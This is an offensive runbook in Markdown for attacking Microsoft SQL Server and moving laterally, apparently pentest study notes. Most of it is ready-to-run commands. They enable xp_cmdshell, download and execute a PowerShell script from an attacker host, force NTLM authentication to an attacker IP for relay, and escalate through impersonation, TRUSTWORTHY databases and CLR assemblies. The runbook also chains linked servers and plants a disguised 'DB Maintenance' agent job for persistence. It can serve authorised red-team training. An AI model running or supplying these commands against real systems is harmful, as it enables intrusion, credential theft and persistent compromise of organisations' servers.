# MSSQL Lateral Movement Runbook

> SQL Server is everywhere in enterprise environments. If you find it, exploit it.

---

## Quick Win Checklist

```
1. Find SQL servers (PowerUpSQL)
2. Check current user access
3. Enable xp_cmdshell if disabled
4. Execute OS commands
5. Enumerate linked servers
6. Move laterally via linked server chains
```

---

## Enumerate MSSQL Servers

```powershell
# PowerUpSQL - find all SQL servers on network
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"}

# Check current user access level
Get-SQLQuery -Instance "<TARGET>\SQLEXPRESS" -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"

# Get all databases
Get-SQLDatabase -Instance "<TARGET>\SQLEXPRESS" -NoDefaults

# Check linked servers
Get-SQLServerLinkCrawl -Instance "<TARGET>\SQLEXPRESS"
```

---

## Enable and Use xp_cmdshell

```sql
-- Enable xp_cmdshell (needs sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <B64_PAYLOAD>';

-- Download and execute
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<KALI>/shell.ps1'')"';
```

**Via PowerUpSQL:**
```powershell
Invoke-SQLOSCmd -Instance "<TARGET>\SQLEXPRESS" -Command "whoami"
```

---

## Impersonation Attack (If Not sysadmin)

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate 'sa' and enable xp_cmdshell
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**See:** `xp_cmdshell_impersonate_revshell_staged.md` for full staged payload.

---

## Linked Server Chain Exploitation

```sql
-- Enumerate linked servers
SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];

-- Chain two hops
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' ) AT [LINKEDSERVER2]') AT [LINKEDSERVER1];
```

**See:** `linked_server_rev_shell.cs` and `LinkedSQLPrivEscRevShell.cs` for C# implementations with full reverse shell.

---

## MSSQL Reverse Shell (C# Tools)

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `mssql`, .NET Framework 4.8
2. Paste `sql-v2.cs`, delete defaults
3. Right-click References → Add Reference → Assemblies → check **System.Data** → OK
4. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
5. Build → Build Solution → output: `bin\x64\Debug\mssql.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /r:System.Data.dll /out:mssql.exe sql-v2.cs`

```cmd
# Run — connects to MSSQL and gets code execution
.\mssql.exe <TARGET> <DB> <USER> <PASS>
```

**linked_server_rev_shell.cs** — runs from SQL context, calls back to your listener via linked servers.
**LinkedSQLPrivEscRevShell.cs** — chains impersonation + linked server + rev shell.

---

## UNC Path Auth Capture (Force NTLM Relay)

```sql
-- Force SQL server to authenticate to your Kali (for relay or capture)
EXEC xp_dirtree '\\<KALI_IP>\share';
EXEC master..xp_fileexist '\\<KALI_IP>\share\test.txt';
```

Then catch with Responder or relay with ntlmrelayx.

---

## Notes
- **SQL Agent jobs**: If SQL Agent running as high-priv account, create a job for code exec
- **sa vs Windows auth**: If Windows auth, use current domain creds; sa = SQL-specific
- **Linked servers run as**: May run as different service account — can escalate
- **MSSQL service account**: Often `NT Service\MSSQL$INSTANCENAME` or a domain account with SeImpersonatePrivilege

---

## Discovery Methods

```powershell
# AD SPN enumeration (find all SQL servers registered in AD):
setspn -T corp.com -Q MSSQLSvc/*
setspn -T corp.com -Q MSSQLSvc/* | Select-String "MSSQLSvc" | ForEach-Object { ($_ -split ":")[0].Trim() }

# Check context and sysadmin status on any accessible server:
EXEC xp_cmdshell 'whoami'  -- fast check if already sysadmin
SELECT SYSTEM_USER          -- current login
SELECT IS_SRVROLEMEMBER('sysadmin')  -- 1 = you're sysadmin
```

```bash
# From Kali via impacket:
impacket-mssqlclient corp.com/user:pass@TARGET -windows-auth
impacket-mssqlclient TARGET -windows-auth    # uses current ticket if KRB5CCNAME set

# Inside impacket-mssqlclient:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> SELECT * FROM master..sysservers  -- linked servers

# mssqlpwner (modern PowerUpSQL replacement):
mssqlpwner corp.com/user:pass@MSSQL_IP enumerate
mssqlpwner corp.com/user:pass@MSSQL_IP exec -c 'whoami'
mssqlpwner corp.com/user:pass@MSSQL_IP -link LINKEDSERVER exec -c 'whoami'
```

---

## TRUSTWORTHY Database Exploitation

If you have `db_owner` in a database with `TRUSTWORTHY ON` set, you can escalate to sysadmin via the `msdb` database (TRUSTWORTHY by default).

```sql
-- Find TRUSTWORTHY databases:
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

-- msdb has TRUSTWORTHY ON by default → dbo in msdb = sysadmin:
USE msdb;
EXECUTE AS USER = 'dbo';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- should return 1

-- Now enable xp_cmdshell:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Revert when done:
REVERT;
```

---

## OLE Automation (Alternative to xp_cmdshell)

When `xp_cmdshell` is blocked but `Ole Automation Procedures` can be enabled:

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;

DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "powershell -enc <B64_PAYLOAD>"';
```

---

## CLR Assembly — Fileless Code Execution

Custom .NET assembly loaded into SQL Server — executes arbitrary code with no shell.

```sql
-- Enable CLR:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'clr enabled',1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- Load from file:
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000)
    AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami';

-- Load from hex (fileless — no file on disk):
CREATE ASSEMBLY myAssembly FROM 0x4D5A900003000000... WITH PERMISSION_SET = UNSAFE;
```

**Convert DLL to hex string (PowerShell):**
```powershell
$f = [IO.File]::OpenRead("\\KALI\share\cmdExec.dll")
$sb = New-Object System.Text.StringBuilder
while (($b = $f.ReadByte()) -gt -1) { $sb.Append($b.ToString("X2")) | Out-Null }
$sb.ToString() | Out-File c:\tools\cmdExec.txt
```

The C# assembly code for `cmdExec` is in `OSEP/` — see the canonical source under `lateral-movement/mssql/`.

---

## Multi-Hop Linked Server Queries

```sql
-- Who am I on a linked server?
SELECT * FROM OPENQUERY([DC01], 'SELECT SYSTEM_USER AS [user]');

-- Check sysadmin on linked server:
SELECT * FROM OPENQUERY([DC01], 'SELECT IS_SRVROLEMEMBER(''sysadmin'') AS isadmin');

-- Two-hop: who am I on server3 via server2?
SELECT mylogin FROM OPENQUERY([DC01],
    'SELECT mylogin FROM OPENQUERY([APPSRV01], ''SELECT SYSTEM_USER AS mylogin'')');

-- Enable xp_cmdshell on linked server:
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
EXEC ('xp_cmdshell ''whoami''') AT DC01

-- Two-hop command execution:
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT APPSRV01') AT DC01
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' ) AT APPSRV01') AT DC01
```

---

## SQL Agent Job Persistence

```sql
-- Create a "maintenance" job that runs your payload on a schedule:
EXEC msdb.dbo.sp_add_job @job_name = N'DB Maintenance', @enabled = 1;
EXEC msdb.dbo.sp_add_jobstep
    @job_name = N'DB Maintenance',
    @step_name = N'Execute',
    @subsystem = N'CMDEXEC',
    @command = N'powershell -enc <B64_PAYLOAD>';
EXEC msdb.dbo.sp_add_schedule @schedule_name = N'Daily', @freq_type = 4,
    @freq_interval = 1, @active_start_time = 030000;
EXEC msdb.dbo.sp_attach_schedule @job_name = N'DB Maintenance', @schedule_name = N'Daily';
EXEC msdb.dbo.sp_add_jobserver @job_name = N'DB Maintenance';

-- Run job immediately:
EXEC msdb.dbo.sp_start_job N'DB Maintenance';
```

---

## NTLM Hash Capture via xp_dirtree

Full workflow → **`05-lateral-movement/mssql/ntlm-via-sql.md`**

```sql
-- Quick trigger (after setting up Responder on Kali):
EXEC master..xp_dirtree "\\192.168.45.X\\test";
```

---

## Full Attack Decision Tree

```
SQL Server found
    ├── sysadmin?
    │       YES → enable xp_cmdshell → exec payload
    │       NO  ├── Can impersonate sa? → EXECUTE AS → enable xp_cmdshell
    │           ├── msdb db_owner? → TRUSTWORTHY → sysadmin
    │           └── CLR available? → load assembly → exec
    ├── Linked servers?
    │       YES → enumerate links → exec on each → find sysadmin context
    └── Service account privilege?
            SeImpersonatePrivilege → Potato attack → SYSTEM
```
